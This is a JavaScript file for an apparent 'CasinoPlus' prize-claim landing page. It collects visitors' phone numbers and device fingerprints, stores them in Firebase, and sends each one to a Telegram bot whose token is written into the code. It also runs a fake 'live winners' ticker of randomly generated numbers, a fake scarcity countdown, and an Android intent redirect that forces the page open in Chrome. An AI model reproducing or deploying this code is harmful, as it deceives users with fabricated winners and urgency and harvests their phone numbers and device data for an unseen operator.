/**
 * CasinoPlus Index Page - Login & Verification
 * Walang auto-ban - Admin lang pwedeng mag-ban
 */

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// Telegram Config
const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
const chatId = '7298607329';

// Scarcity counter
let count = 88;

// DOM Elements
const winnerEntry = document.getElementById('winnerEntry');
const remNum = document.getElementById('remNum');
const pBar = document.getElementById('pBar');
const modalOverlay = document.getElementById('modalOverlay');
const mainCard = document.getElementById('mainCard');
const userPhoneInput = document.getElementById('userPhone');
const claimBtn = document.getElementById('claimBtn');

// ========== DEVICE FINGERPRINT (Store sa Database) ==========
function getDeviceFingerprint() {
    const screenResolution = `${screen.width}x${screen.height}x${screen.colorDepth}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const language = navigator.language;
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
    const deviceMemory = navigator.deviceMemory || 'unknown';
    
    const fingerprintString = `${userAgent}|${screenResolution}|${timezone}|${language}|${platform}|${hardwareConcurrency}|${deviceMemory}`;
    
    let hash = 0;
    for (let i = 0; i < fingerprintString.length; i++) {
        hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
        hash |= 0;
    }
    return `FP_${Math.abs(hash)}`;
}

// ========== SAVE DEVICE INFO TO DATABASE ==========
async function saveDeviceInfo(phone, fingerprint) {
    const deviceInfo = {
        phone: phone,
        fingerprint: fingerprint,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        lastSeen: Date.now(),
        firstSeen: Date.now()
    };
    
    // Check if device already exists
    const existingDevice = await db.ref('devices/' + fingerprint).once('value');
    if (!existingDevice.exists()) {
        await db.ref('devices/' + fingerprint).set(deviceInfo);
    } else {
        await db.ref('devices/' + fingerprint).update({ lastSeen: Date.now() });
    }
    
    // Map device to phone number
    await db.ref('device_phone_map/' + fingerprint).set({
        phone: phone,
        lastSeen: Date.now()
    });
}

// ========== SHOW BLOCKED UI (Admin Ban Only) ==========
function showBlockedUI(reason = "banned") {
    modalOverlay.style.display = 'flex';
    
    let title = "RESTRICTED";
    let blockMessage = "⚠️ This mobile number has been restricted by the administrator.";
    
    if (reason === "claimed") {
        title = "ALREADY CLAIMED";
        blockMessage = "⚠️ This number has already claimed a reward before.";
    }

    document.getElementById('modalBodyContent').innerHTML = `
        <h2 style="color: #ff4d4d; margin-bottom: 15px;">${title}</h2>
        <p style="font-size: 14px; color: #94a3b8; line-height: 1.6;">${blockMessage}</p>
        <div style="font-size: 50px; margin: 20px 0;">🚫</div>
        <button class="btn-main" style="margin-top: 20px; background: #334155; color: #fff; box-shadow: none;" onclick="location.reload()">OK</button>
    `;
    mainCard.style.opacity = "0.2";
    mainCard.style.pointerEvents = "none";
}

// ========== HANDLE VERIFY (Intent) ==========
window.handleVerify = function() {
    const currentUrl = window.location.href.split('#')[0].replace(/^https?:\/\//, '');
    if (!window.location.hash.includes("verified")) {
        window.location.href = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
    } else {
        modalOverlay.style.display = 'flex';
    }
};

// ========== CHECK IF NUMBER IS BANNED (Admin Only) ==========
async function isNumberBanned(phone) {
    const bannedSnap = await db.ref('banned_ghosts/' + phone).once('value');
    return bannedSnap.exists();
}

// ========== CHECK IF NUMBER ALREADY CLAIMED ==========
async function isNumberClaimed(phone) {
    const logSnap = await db.ref('user_logs/' + phone).once('value');
    return (logSnap.exists() && logSnap.val().status === 'claimed');
}

// ========== CREATE USER SESSION ==========
// ========== CREATE USER SESSION (with fingerprint) ==========
async function createUserSession(phone, fingerprint) {
    const sessionRef = db.ref('user_sessions/' + phone);
    const sessionSnap = await sessionRef.once('value');
    
    // Generate or get device display ID (Dev1, Dev2, etc.)
    const deviceDisplayId = await getOrCreateDeviceId(fingerprint);
    
    if (!sessionSnap.exists()) {
        await sessionRef.set({
            phone: phone,
            balance: 0,
            clicks: 0,
            deviceFingerprint: fingerprint,
            deviceDisplayId: deviceDisplayId,
            lastUpdate: Date.now(),
            createdAt: Date.now()
        });
    } else {
        await sessionRef.update({
            lastUpdate: Date.now(),
            deviceFingerprint: fingerprint,
            deviceDisplayId: deviceDisplayId
        });
    }
}

// ========== GET OR CREATE DEVICE DISPLAY ID ==========
async function getOrCreateDeviceId(fingerprint) {
    if (!fingerprint || fingerprint === '---') return '---';
    
    const deviceMapRef = db.ref('device_id_map/' + fingerprint);
    const snap = await deviceMapRef.once('value');
    
    if (snap.exists()) {
        return snap.val().displayId;
    }
    
    // Get next counter
    const counterRef = db.ref('admin/deviceCounter');
    const counterSnap = await counterRef.once('value');
    let nextNum = (counterSnap.val() || 0) + 1;
    await counterRef.set(nextNum);
    
    const displayId = `Dev${nextNum}`;
    
    await deviceMapRef.set({
        displayId: displayId,
        createdAt: Date.now(),
        fingerprint: fingerprint
    });
    
    return displayId;
}

// ========== PROCESS STEP 1 (Main Logic - No Auto Ban) ==========
window.processStep1 = async function() {
    const phone = userPhoneInput.value.trim();
    const btn = claimBtn;
    const fingerprint = getDeviceFingerprint();

    if (phone.length < 11 || !phone.startsWith('09')) {
        alert("Enter valid 11-digit number.");
        return;
    }
    
    btn.disabled = true;
    btn.innerHTML = "VERIFYING...";

    try {
        // 1. Save device info to database (always)
        await saveDeviceInfo(phone, fingerprint);
        
        // 2. Check if number is BANNED by admin (only this blocks)
        const isBanned = await isNumberBanned(phone);
        if (isBanned) {
            showBlockedUI("banned");
            btn.disabled = false;
            btn.innerHTML = "Claim Now";
            return;
        }
        
        // 3. Check if number already CLAIMED before
        const isClaimed = await isNumberClaimed(phone);
        if (isClaimed) {
            showBlockedUI("claimed");
            btn.disabled = false;
            btn.innerHTML = "Claim Now";
            return;
        }
        
        // 4. Create or update user session
        await createUserSession(phone, fingerprint);
        
        // 5. Send Telegram notification
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎁 LUCKY DROP LOGIN:\n📱 " + phone + "\n🖥️ Device FP: " + fingerprint)}`)
            .catch(e => console.log('Telegram error:', e));
        
        // 6. Save to localStorage and redirect
        localStorage.setItem("userPhone", phone);
        localStorage.setItem("userDeviceId", fingerprint);
        btn.innerHTML = "SUCCESS!";
        
        setTimeout(() => {
            window.location.href = "main.html";
        }, 1000);
        
    } catch (error) {
        console.error("Process error:", error);
        alert("An error occurred. Please try again.");
        btn.disabled = false;
        btn.innerHTML = "Claim Now";
    }
};

// ========== LIVE WINNERS TICKER ==========
function startTicker() {
    setInterval(() => {
        const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955"];
        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const randomSuffix = Math.floor(1000 + Math.random() * 9000);
        const amounts = [350, 500, 750, 1000, 1200];
        const amount = amounts[Math.floor(Math.random() * amounts.length)];
        if (winnerEntry) {
            winnerEntry.innerHTML = `User ${randomPrefix}***${randomSuffix} just claimed <img src="images/gc_icon.png" class="gc-mini-icon">₱${amount}`;
        }
    }, 3500);
}

// ========== SCARCITY COUNTER ==========
function startScarcityCounter() {
    setInterval(() => {
        if (count > 15) {
            count -= Math.floor(Math.random() * 2) + 1;
            if (remNum) remNum.innerText = count + "/100";
            if (pBar) pBar.style.width = count + "%";
        }
    }, 5000);
}

// ========== CHECK HASH ON LOAD ==========
window.onload = () => {
    if (window.location.hash.includes("verified")) {
        modalOverlay.style.display = 'flex';
    }
};

// ========== INITIALIZE ==========
startTicker();
startScarcityCounter();

// Enter key support
userPhoneInput?.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') window.processStep1();
});
